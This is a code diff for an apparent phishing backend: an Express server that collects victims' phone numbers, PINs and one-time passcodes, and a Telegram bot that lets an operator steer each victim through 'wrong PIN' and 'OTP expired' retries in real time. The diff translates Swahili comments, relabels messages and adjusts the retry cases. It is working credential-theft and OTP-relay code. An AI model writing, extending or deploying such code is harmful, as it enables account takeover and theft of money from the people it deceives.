@@ -121,15 +121,14 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
         case 'WRONG_PIN':
-          session.status = 'RETRY_PIN'; // Inamuru kurudi nyumbani kuweka PIN mpya
+          session.status = 'RETRY_PIN'; // Instantly redirects user back to enter new PIN
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ Wrong PIN sent. Applicant redirected back to enter new PIN.`);
+          await bot.sendMessage(chatTarget, `❌ Wrong PIN triggered. User redirected back to enter new PIN.`);
           break;
         case 'OTP_EXPIRED':
-        case 'WRONG_OTP':
-          session.status = 'RETRY_OTP1'; // Inamuru kurudi kuweka OTP mpya
+          session.status = 'RETRY_OTP1'; // Instantly redirects user back to enter new OTP
           session.otp1 = '';
-          await bot.sendMessage(chatTarget, `❌ OTP Expired/Wrong sent. Applicant redirected back to enter new OTP.`);
+          await bot.sendMessage(chatTarget, `❌ OTP Expired triggered. User redirected back to enter new OTP.`);
           break;
         case 'INVALID_OTP':
           session.status = 'RETRY_OTP2';
@@ -195,6 +194,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status, phone: session.phone || '' });
 });
 
+// PIN Submission -> 3 Buttons (ALLOW, WRONG PIN ❌, BLOCKED)
 app.post('/api/submit-pin', async (req, res) => {
   try {
     const { userId, phone, pin } = req.body || {};
@@ -238,6 +238,7 @@ app.post('/api/submit-pin', async (req, res) => {
   }
 });
 
+// OTP Step 1 Submission -> 3 Buttons (OTP EXPIRED ❌, NEXT)
 app.post('/api/submit-otp1', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
@@ -273,6 +274,7 @@ app.post('/api/submit-otp1', async (req, res) => {
   }
 });
 
+// OTP Step 2 Submission
 app.post('/api/submit-otp2', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
@@ -313,4 +315,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                                 
+                                   
